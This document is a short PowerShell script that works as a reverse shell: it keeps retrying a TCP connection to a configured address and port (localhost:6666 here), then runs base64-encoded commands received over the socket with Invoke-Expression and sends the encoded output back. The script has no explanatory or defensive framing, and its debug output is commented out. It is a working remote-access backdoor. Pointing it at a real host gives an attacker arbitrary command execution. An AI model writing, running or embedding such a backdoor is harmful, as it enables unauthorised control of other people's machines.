$address = 'localhost'
$port = 6666

try {
	while($true) {
		try {
			#Write-Host "Trying to reach "$address":"$port
			$client = New-Object System.Net.Sockets.TcpClient($address, $port)  
			$stream = $client.GetStream()
			$writer = New-Object System.IO.StreamWriter($stream)
			$reader = New-Object System.IO.StreamReader($stream)
			break
		}
		catch {
			Start-Sleep -s 10
		}
	}
	#Write-Host "Connected"
	while($true) {
		$raw = $reader.ReadLine()
		$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($raw))

		if ($cmd -eq 'exit') {
			break
		}
		try {
			$output = [string](iex $cmd)
		} catch {
			$output = $_.Exception.Message
		}
		if(!$output) {
			$output = " "
		}
		$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
		$writer.WriteLine($enc)
		$writer.Flush()
	}
} catch {
	#Write-Host $error[0];
	$writer.Close()
	$reader.Close()
	$stream.Close()
	$client.Close()
}